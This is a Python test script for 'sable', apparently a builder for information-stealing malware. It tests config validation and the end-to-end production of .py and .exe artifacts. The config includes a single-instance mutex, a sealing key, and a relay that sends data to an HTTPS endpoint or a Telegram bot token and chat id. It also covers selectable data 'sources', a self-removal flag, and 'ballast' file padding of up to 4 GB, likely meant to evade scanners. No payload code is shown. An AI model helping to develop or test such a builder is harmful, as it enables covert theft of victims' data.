"""Validate + pipeline contract: six rules, stage ordering, real end-to-end build."""

from __future__ import annotations

import os
import sys
import tempfile
from dataclasses import replace
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))

from core import pipeline, validate
from core.schema import RelayConfig, RunConfig, SourceConfig

results: list[tuple[str, bool, str]] = []


def check(label: str, ok: bool, detail: str = "") -> None:
    results.append((label, ok, str(detail)))


MUTEX = "Global\\SABLE_VALIDATE_9f2c"
SEAL_KEY = "k-3f9a-validate-key"


def cfg(**overrides):
    base = RunConfig(
        schema_version=1,
        mutex=MUTEX,
        seal_key=SEAL_KEY,
        relay=RelayConfig(kind="https", endpoint="https://example.invalid/relay"),
        sources=SourceConfig(),
        self_remove=False,
        ballast_mb=0,
    )
    return base if not overrides else replace(base, **overrides)


def rules(problems) -> set[str]:
    return {p.rule for p in problems}


def main() -> int:
    # --- happy path -----------------------------------------------------------
    problems = validate.validate(cfg(), mode="py")
    check("clean config has no blocking", not validate.blocking(problems), len(problems))

    # --- rule 1: mutex --------------------------------------------------------
    check("empty mutex blocks", "mutex" in rules(validate.validate(cfg(mutex="   "), mode="py")))
    check(
        "long mutex blocks",
        "mutex" in rules(validate.validate(cfg(mutex="x" * 201), mode="py")),
    )
    bad = validate.validate(cfg(mutex='Global\\a<b>c'), mode="py")
    check("illegal mutex chars block", "mutex" in rules(bad), validate.describe(bad))
    note = validate.validate(cfg(mutex="\\NoNamespace"), mode="py")
    check(
        "leading backslash is a note not a block",
        not validate.blocking(note) and "mutex" in rules(note),
        validate.describe(note),
    )

    # --- rule 2: seal key -----------------------------------------------------
    check("short key blocks", "seal_key" in rules(validate.validate(cfg(seal_key="abc"), mode="py")))
    check(
        "key with trailing space blocks",
        "seal_key" in rules(validate.validate(cfg(seal_key=SEAL_KEY + " "), mode="py")),
    )
    check(
        "12-char key passes",
        not validate.blocking(validate.validate(cfg(seal_key="abcdefghijkl"), mode="py")),
    )

    # --- rule 3: endpoint, keyed on kind --------------------------------------
    cases = [
        ("https", "https://relay.example/ingest", True, "valid https"),
        ("https", "", False, "empty endpoint"),
        ("https", "ftp://relay.example", False, "wrong scheme"),
        ("https", "https://", False, "no host"),
        ("https", "https://relay.example/a b", False, "embedded space"),
        ("https", " https://relay.example", False, "leading space"),
        ("telegram", "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw$42", True, "valid telegram"),
        ("telegram", "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw", False, "bare token, no chat"),
        ("telegram", "nocolon$42", False, "token has no colon"),
        ("telegram", "123456789:short$42", False, "token secret too short"),
        ("telegram", "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw", False, "no chat"),
        ("telegram", "a$b$c", False, "two dollars"),
    ]
    for kind, endpoint, passes, label in cases:
        got = validate.validate(cfg(relay=RelayConfig(kind=kind, endpoint=endpoint)), mode="py")
        ok = not validate.blocking(got)
        check(f"endpoint {label}", ok == passes, validate.describe(got))

    unknown = validate.validate(
        cfg(relay=RelayConfig(kind="carrier-pigeon", endpoint="x")), mode="py"
    )
    paths = {p.path for p in unknown}
    check("unknown kind blocks under endpoint rule", "relay.kind" in paths, str(paths))

    # --- rule 4: at least one source ------------------------------------------
    from core.schema import SOURCE_FIELDS

    dark = SourceConfig(**{name: False for name in SOURCE_FIELDS})
    check("all sources off blocks", "sources" in rules(validate.validate(cfg(sources=dark), mode="py")))

    # --- rule 5: ballast ------------------------------------------------------
    check("negative ballast blocks", "ballast_mb" in rules(validate.validate(cfg(ballast_mb=-1), mode="py")))
    check("over-ceiling ballast blocks", "ballast_mb" in rules(validate.validate(cfg(ballast_mb=4097), mode="py")))
    check("ceiling is legal", not validate.blocking(validate.validate(cfg(ballast_mb=4096), mode="py")))
    noted = validate.validate(cfg(ballast_mb=8), mode="py")
    check(
        "ballast on script is a note",
        not validate.blocking(noted) and "ballast_mb" in rules(noted),
        validate.describe(noted),
    )

    # --- rule 6: output -------------------------------------------------------
    with tempfile.TemporaryDirectory(prefix="sable-pipe-") as scratch:
        work = Path(scratch)
        stub = work / "stub.bin"
        stub.write_bytes(os.urandom(4096))
        empty_stub = work / "empty.bin"
        empty_stub.write_bytes(b"")

        check(
            "exe without launcher blocks",
            "output" in rules(validate.validate(cfg(), mode="exe")),
        )
        check(
            "exe with launcher passes",
            not validate.blocking(validate.validate(cfg(), mode="exe", stub=stub)),
        )
        check(
            "empty launcher blocks",
            "output" in rules(validate.validate(cfg(), mode="exe", stub=empty_stub)),
        )
        check("unknown mode blocks", "output" in rules(validate.validate(cfg(), mode="dll")))
        check(
            "wrong name suffix blocks",
            "output" in rules(validate.validate(cfg(), mode="exe", name="x.py", stub=stub)),
        )
        check(
            "bare name is a note",
            not validate.blocking(validate.validate(cfg(), mode="py", name="report")),
        )
        check(
            "matching name passes",
            not validate.blocking(validate.validate(cfg(), mode="py", name="report.py")),
        )

    # --- never raises ---------------------------------------------------------
    broken = cfg()
    object.__setattr__(broken, "sources", None)
    fallback = validate.validate(broken, mode="py")
    check(
        "broken config returns internal, does not raise",
        "internal" in rules(fallback),
        validate.describe(fallback),
    )
    check("describe empty is blank", validate.describe([]) == "")
    check(
        "describe caps at limit",
        validate.describe(
            [validate.Problem("r", "p", "m") for _ in range(9)], limit=5
        ).endswith("and 4 more"),
    )

    # --- pipeline: end to end, script mode ------------------------------------
    with tempfile.TemporaryDirectory(prefix="sable-run-") as scratch:
        out = Path(scratch) / "out"
        events: list[pipeline.Event] = []
        stub = Path(scratch) / "stub.bin"
        stub.write_bytes(os.urandom(4096))

        outcome = pipeline.run(
            cfg(),
            root=ROOT,
            out_dir=out,
            mode="py",
            progress=events.append,
        )
        check("pipeline produced an artifact", outcome.artifact.is_file(), outcome.artifact)
        check("artifact is named or generated", outcome.artifact.suffix == ".py", outcome.artifact.name)
        check("no working name left behind",
              not any(p.name.startswith("sable-build-") for p in out.iterdir()),
              str([p.name for p in out.iterdir()]))
        check("outcome size matches disk", outcome.size == outcome.artifact.stat().st_size)
        check("outcome seconds positive", outcome.seconds > 0, f"{outcome.seconds:.3f}")

        stages = [e.stage for e in events]
        check("every stage fired", set(stages) == set(pipeline.STAGES), str(sorted(set(stages))))
        check("first event is validate", stages[0] == pipeline.STAGE_VALIDATE)
        check("last event is done", stages[-1] == pipeline.STAGE_DONE)
        fractions = [e.fraction for e in events]
        check("fractions monotonic", fractions == sorted(fractions), str(fractions))
        check("fraction ends at 1.0", fractions[-1] == 1.0, fractions[-1])

        # the shipped script must actually run its own boot path shape
        text = outcome.artifact.read_text(encoding="utf-8")
        check("script carries the key", SEAL_KEY in text)
        check("script parses", bool(compile(text, str(outcome.artifact), "exec")))

        # --- pipeline: custom name -------------------------------------------------
        named = pipeline.run(cfg(), root=ROOT, out_dir=out, mode="py", name="quarterly")
        check("custom bare name gets extension", named.artifact.suffix == ".py", named.artifact.name)
        check("custom name honoured", named.artifact.stem.startswith("quarterly"), named.artifact.name)

        # --- pipeline: collision does not overwrite --------------------------------
        again = pipeline.run(cfg(), root=ROOT, out_dir=out, mode="py", name="quarterly")
        check("collision produced a different file", again.artifact != named.artifact,
              f"{named.artifact.name} then {again.artifact.name}")
        check("original survived", named.artifact.is_file())

        # --- pipeline: exe mode ----------------------------------------------------
        exe = pipeline.run(cfg(), root=ROOT, out_dir=out, mode="exe", stub=stub)
        check("exe produced", exe.artifact.suffix == ".exe" and exe.artifact.is_file())
        blob = exe.artifact.read_bytes()
        check("exe carries footer", blob[-12:-8] == b"SBLT", blob[-12:].hex())

        # --- pipeline: validation failure carries every problem --------------------
        try:
            pipeline.run(cfg(mutex="", seal_key="x"), root=ROOT, out_dir=out, mode="py")
        except pipeline.ValidationFailed as exc:
            paths = {p.path for p in exc.problems}
            check("ValidationFailed carries both fields", {"mutex", "seal_key"} <= paths, str(paths))
            check("ValidationFailed names its stage", exc.stage == "validate")
        except Exception as exc:
            check("ValidationFailed carries both fields", False, f"{type(exc).__name__}: {exc}")
        else:
            check("ValidationFailed carries both fields", False, "no error raised")

        # --- pipeline: cancel stops before work ------------------------------------
        try:
            pipeline.run(cfg(), root=ROOT, out_dir=out, mode="py", cancel=lambda: True)
        except pipeline.PipelineCancelled as exc:
            check("cancel raises PipelineCancelled", exc.stage == "validate")
        except Exception as exc:
            check("cancel raises PipelineCancelled", False, type(exc).__name__)
        else:
            check("cancel raises PipelineCancelled", False, "no error raised")

        # --- pipeline: a raising progress callback does not break the build -------
        def noisy(event):
            raise RuntimeError("ui slot bug")

        survived = pipeline.run(cfg(), root=ROOT, out_dir=out, mode="py", progress=noisy)
        check("raising progress callback survives", survived.artifact.is_file())

    failed = [item for item in results if not item[1]]
    for label, ok, detail in results:
        print(f"{'PASS' if ok else 'FAIL'}  {label}  {detail}")
    print(f"\n{len(results) - len(failed)}/{len(results)} passed")
    return 0 if not failed else 1


if __name__ == "__main__":
    raise SystemExit(main())
